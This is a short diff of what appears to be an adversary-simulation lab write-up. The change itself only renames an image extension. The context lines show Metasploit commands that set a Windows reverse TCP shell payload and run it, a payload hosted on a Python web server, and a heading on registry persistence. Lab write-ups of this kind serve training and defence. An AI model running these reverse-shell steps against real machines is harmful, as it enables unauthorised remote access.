@@ -44,7 +44,7 @@ Hosted the payload using a Python-based web server and initiated a Metasploit mu
 > `> set payload windows/x64/shell/reverse_tcp`
 > `> exploit`
 
-![Adversary Simulation Terminal](images/weapon.png)
+![Adversary Simulation Terminal](images/weapon.PNG)
 *Alternative Text: Execution of nmap, payload generation, and listener setup on Kali Linux.*
 
 ### 4. Persistence (Registry Modification)
